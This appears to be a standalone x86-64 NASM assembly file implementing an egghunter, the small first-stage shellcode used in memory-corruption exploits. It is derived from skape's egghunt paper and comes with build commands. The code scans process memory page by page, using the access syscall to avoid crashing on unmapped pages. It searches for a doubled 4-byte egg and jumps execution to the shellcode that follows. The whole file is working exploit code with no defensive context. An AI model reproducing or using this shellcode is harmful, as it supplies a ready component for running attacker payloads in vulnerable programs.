; David @InfinitelyManic
; code derived from http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 
; nasm -felf64 -g -F dwarf egghunter.s -o egghunter.o && ld egghunter.o -o egghunter
; 
section .text
	global _start
_start:
	xor edx, edx			; init edx
L0:
	or dx, 0xfff			; assumes 4096 PAGE_SIZE boundary
L1:
	inc edx				; 0x...1000 = 4096 PAGE_SIZE, 0x1000++
	lea rdi, [edx+0x4]		; get instructions following egg 
	; rsi				; mode accessibility check is = F_OK ; assumes rsi = 0
					; │#  define F_OK  0   /* Test for existence.  */
	push byte 21			; Please note that 0x21 is for 32-bit syscall; don't get it confused 
	pop rax				; access syscall 
	syscall 
	cmp al, 0xf2			; ENOET ?
	jz L0				; inc by PAGE_SIZE
_egg:
	mov eax, 0x50905090		; egg  - 4 bytes
	mov edi, edx			; scas base - pointer address 

	scasd				; search for first 4 byte egg in egghunter then inc 4 bytes
	jnz L1				; if egg not found then inc addr one byte 
	scasd				; search for the last 4 byte egg in egg PROG then inc 4 bytes
	jnz L1				; if egg not found then advance addr one byte 

	jmp rdi				; 8 byte egg found, executes shellcode...
